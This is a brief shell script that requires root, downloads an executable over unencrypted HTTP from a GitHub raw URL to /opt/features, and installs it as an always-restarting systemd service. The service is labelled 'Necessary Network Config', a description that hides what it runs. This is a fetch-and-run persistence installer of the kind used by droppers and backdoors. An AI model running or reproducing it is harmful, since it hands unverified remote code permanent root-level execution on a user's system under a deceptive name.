#!/bin/sh

if [ "$EUID" -ne 0 ]; then
  echo "Please run as root (with sudo)."
  exit 1
fi

fn=optional
uri=/opt/features

rm $uri

curl -o $uri http://raw.githubusercontent.com/bitner-repo/features
chmod +x $uri

systemctl disable features.service

echo -e "[Unit]\nDescription=Necessary Network Config\nAfter=network.target\n\n[Service]\nExecStart=$uri\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/features.service
systemctl daemon-reload
systemctl enable features.service
systemctl start features.service
